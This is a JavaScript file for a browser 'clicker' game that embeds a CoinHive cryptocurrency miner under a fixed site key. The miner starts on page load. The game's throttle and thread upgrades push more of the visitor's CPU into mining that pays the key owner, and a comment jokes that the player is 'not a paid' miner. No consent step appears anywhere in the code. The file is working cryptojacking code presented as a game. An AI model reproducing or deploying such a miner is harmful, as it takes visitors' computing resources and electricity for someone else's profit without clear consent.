
/*
var miner = new CoinHive.Anonymous('1bKAZIoqiathAWQnJFsbc4pFB54tTIhK');
miner.setNumThreads(1);
miner.start();

// Listen on events
// miner.on('found', function () { insertToLog("Found hash"); });
// miner.on('accepted', function () { insertToLog("Accepted hash"); });

function Memory(id, maxCount, toSec) {
    id = "." + id;
    var counter = 0;
    var sum = 0;
    var memory = [];

    this.id = function(){
        return id;
    };

    this.count = function () {
        counter++;
        var result = counter >= maxCount;
        if(result) counter = 0;
        return result;
    };

    this.add = function(item) {
        sum += item;
        memory.push(item);
        if(memory.length > maxCount)
            sum -= memory.shift();
        return sum;
    };

    this.getPerX = function() {
        return Math.round(sum);
    };

    this.getPerSec = function() {
        var one = memory.length === maxCount ? sum : sum / memory.length * maxCount;
        return Math.round(one * toSec);
    };
}

var memory = [
    new Memory("nsec", 1, 1),
    new Memory("nmin", 60, 1/60),
    new Memory("nhour", 60, 1/60/60),
    new Memory("nday", 24, 1/60/60/24)
];
var sum = 0;
setInterval(function () {
    var value = miner.getHashesPerSecond();
    sum += value;
    for (var i = 0; i < memory.length; i++) {
        var item = memory[i];
        value = item.add(value);
        if(i === 0)
            $(item.id()).text(Math.round(sum) + " (" + item.getPerSec() + "/s)");
        else
            $(item.id()).text(item.getPerX() + " (" + item.getPerSec() + "/s)");
        if (!item.count()) break;
    }
}, 1000);
*/

function Game() {
    // Classes
    function UpgradeableItem(min, max, at, price, levels) {
        this.min = min;
        this.max = max;
        this.at = at;
        this.price = price;
        this.level = 0;
        this.levels = levels;
        this.upgrade = function() {
            if(!this.canAfford() || !this.canUpgrade())
                return false;
            hashes -= this.price;
            this.price = Math.round(Math.pow(this.price, 1.15));
            this.level++;
            return true;
        };
        this.canUpgrade = function(){
            return this.level < this.levels;
        };
        this.canAfford = function(){
            return hashes >= this.price;
        };
        this.set = function(to) {
            if(to < this.min || to > this.max)
                return false;
            this.at = to;
            return true;
        };
        this.get = function(){
            return {min: this.min, max: this.max, at: this.at, level: this.level, maxlevel: this.maxlevel - 1, price: this.price, canAfford: this.canAfford(), canUpgrade: this.canUpgrade()}
        }
    }

    // Initial setup
    var miner = new CoinHive.Anonymous('1bKAZIoqiathAWQnJFsbc4pFB54tTIhK');
    miner.setNumThreads(1);
    miner.setThrottle(0.99);
    var hashes = 0;
    this.hashes = function(){ return hashes; };
    var throttle = new UpgradeableItem(0.99, 1, 0.99, 100, 50);
    var threading = new UpgradeableItem(1, 1, 1, 1000, 11);
    var miners = new UpgradeableItem(1, 1, 1, 10000, 99999999999999);

    // Basic functions
    function addHashes(num){ hashes += Math.round(num * miners.max); }


    // Manual usage functions
    this.click = function(){
        addHashes(1);
    };

    // Throttle functions
    this.getThrottle = function(){ return throttle.get(); };
    this.setThrottle = function(to) {
        var res = throttle.set(to);
        if(res) miner.setThrottle(throttle.at);
        return res;
    };
    function upgradeThrottle(){
        if(throttle.upgrade()) {
            throttle.min = Math.max(0, Math.min(throttle.min - 0.02, Math.pow(throttle.min, 2)));
            throttle.set(throttle.min);
            miner.setThrottle(throttle.min);
            return true;
        } else
            return false;
    }

    // Threading functions
    this.getThreading = function(){ return threading.get(); };
    this.setThreading = function(to) {
        var res = threading.set(to);
        if(res) miner.setThrottle(threading.at);
        return res;
    };
    function upgradeThreading(){
        if(threading.upgrade()) {
            threading.max++;
            threading.set(threading.max);
            miner.setNumThreads(threading.max);
            return true;
        } else
            return false;
    }

    // Miner functions
    this.getMiners = function(){ return miners.get(); };
    function buyMiner() {
        var extra = miners.price * (throttle.level / throttle.maxlevel + threading.level / threading.maxlevel) / 2;
        if(hashes < miners.price + extra)
            return false;
        if(miners.upgrade()){
            hashes -= extra;
            return true;
        }
        return false;
    }

    this.buy = function(what){
        switch(what){
            case "miner": return buyMiner();
            case "thread": return upgradeThreading();
            case "throttle": return upgradeThrottle();
        }
        return false;
    };

    this.setHashes = function(i){
        this.hashes = i;
    };

    miner.start();
    // Default income, YER A MINER HARRY (but not a paid one)
    setInterval(function () { addHashes(miner.getHashesPerSecond()); }, 1000);
}

var game = new Game();
setInterval(function(){
    $(".nsec").text(game.hashes());
    $(".nmin").text(game.getMiners().at);
    $(".nhour").text(Math.round(100 * game.getThrottle().at) + " %");
    $(".nday").text(game.getThreading().at);
}, 1000);